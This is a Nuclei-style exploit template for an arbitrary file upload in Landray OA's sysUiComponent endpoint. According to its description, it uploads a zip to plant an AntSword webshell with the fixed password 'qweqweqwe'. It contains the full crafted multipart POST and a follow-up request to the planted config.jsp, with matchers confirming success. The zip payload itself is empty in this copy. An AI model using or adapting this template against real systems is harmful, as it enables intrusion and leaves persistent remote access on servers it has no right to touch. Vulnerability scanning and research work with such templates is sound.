id: landary-AntSword-webshell-qweqweqwe

info:
  name: 蓝凌OA sysUiComponent 任意文件上传
  author: ro1t
  description: Landray-OA zip上传webshell,antsword 密码 qweqweqwe
  severity: critical
  tags: landray,oa,treexml,rce,vuln

variables:
  boundary: "{{to_lower(rand_base(20))}}"
  filename: "{{to_lower(rand_base(20))}}"

http:
  - raw:
      - |
        POST /sys/ui/sys_ui_component/sysUiComponent.do?method=getThemeInfo&s_ajax=true HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
        Content-Type: multipart/form-data; boundary={{boundary}}
        
        --{{boundary}}
        Content-Disposition: form-data; name="file"; filename="{{filename}}.zip"
        Content-Type: application/x-zip-compressed
        
        {{base64_decode("")}}
        --{{boundary}}--
      - |
        GET /resource/ui-component/Wiop/config.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
    matchers:
      - type: dsl
        dsl:
          - "contains(body_1,'fdThumbnail') && contains(body_1,'Wiop')"
          - "status_code_2==200 && contains(body_2,'java.lang.NullPointerException')"
        condition: and